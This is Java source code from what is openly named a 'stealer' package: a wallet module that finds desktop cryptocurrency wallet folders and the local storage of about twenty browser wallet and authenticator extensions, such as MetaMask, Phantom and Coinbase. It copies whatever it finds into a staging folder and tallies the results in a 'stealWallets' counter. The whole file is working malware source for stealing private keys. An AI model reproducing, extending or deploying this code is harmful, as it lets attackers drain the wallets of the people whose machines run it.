package scruffy.stealer.impl.coin;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class wallet extends utilities {

    public static Map<String, String> path = new HashMap<>();
    
    public void initialize() {
        Map<String, String> app = new HashMap<String, String>() {{
            put("z_cash", System.getenv("appdata") + "/Zcash");
            put("armory", System.getenv("appdata") + "/Armory");
            put("bytecoin", System.getenv("appdata") + "/bytecoin");
            put("jaxx", System.getenv("appdata") + "/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb");
            put("exodus", System.getenv("appdata") + "/Exodus/exodus.wallet");
            put("ethereum", System.getenv("appdata") + "/Ethereum/keystore");
            put("electrum", System.getenv("appdata") + "/Electrum/wallets");
            put("atomic_wallet", System.getenv("appdata") + "/atomic/Local Storage/leveldb");
            put("guarda", System.getenv("appdata") + "/Guarda/Local Storage/leveldb");
            put("coinomi", System.getenv("appdata") + "/Coinomi/Coinomi/wallets");        
        }};
        
        for (Map.Entry<String, String> entry : app.entrySet()) {
            String name = entry.getKey();
            String path = entry.getValue();
            File file = new File(path);
            if (file.exists()) {
                try {
                    FileUtils.copyDirectory(file, new File(getFolder() + "/wallet/application/" + name));
					content.add("wallet");
                    stealWallets += 1;
                } catch (Exception ignore) {}
            }
        }

        Map<String, String> browser_app = new HashMap<String, String>() {{
            put("metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
            put("binance", "fhbohimaelbohpjbbldcngcnapndodjp");
            put("phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa");
            put("coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad");
            put("ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec");
            put("exodus", "aholpfdialjgjfhomihkjbmgjidlcdno");
            put("coin98", "aeachknmefphepccionboohckonoeemg");
            put("kardia_chain", "pdadjkfkgcafgbceimcpbkalnfnepbnk");
            put("terra_station", "aiifbnbfobpmeekipheeijimdpnlpgpp");
            put("wombat", "amkmjjmmflddogmhpjloimipbofnfjih");
            put("harmony", "fnnegphlobjdpkhecapkijjdkgcjhkib");
            put("nami", "lpfcbjknijpeeillifnkikgncikgfhdo");
            put("martian_aptos", "efbglgofoippbgcjepnhiblaibcnclgk");
            put("braavos", "jnlgamecbpmbajjfhmmmlhejkemejdma");
            put("xdefi", "hmeobnfnfcmdkdcmlblgagmfpfboieaf");
            put("yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb");
            put("ton", "nphplpgoakhhjchkkhmiggakijnkhfnd");
            put("authenticator", "bhghoamapcdpbohphigoooaddinpkbai");
            put("metamask_edge", "ejbalbakoplchlghecdalmeeeajnimhm");
            put("tron", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
        }};
        
        for (Map.Entry<String, String> pathEntry : path.entrySet()) {
            String pathKey = pathEntry.getKey();
            String pathValue = pathEntry.getValue();
            for (Map.Entry<String, String> appEntry : browser_app.entrySet()) {
                String appKey = appEntry.getKey();
                String appValue = appEntry.getValue();
                File file = new File(pathValue + "/Local Extension Settings/" + appValue);
                if (file.exists()) {
                    try {
                        FileUtils.copyDirectory(file, new File(getFolder() + "/wallet/browser/" + appKey + " [" + pathKey + "]"));
    					content.add("wallet");
                        stealWallets += 1;
                    } catch (Exception ignore) {}
                }
            }
        }
    }

}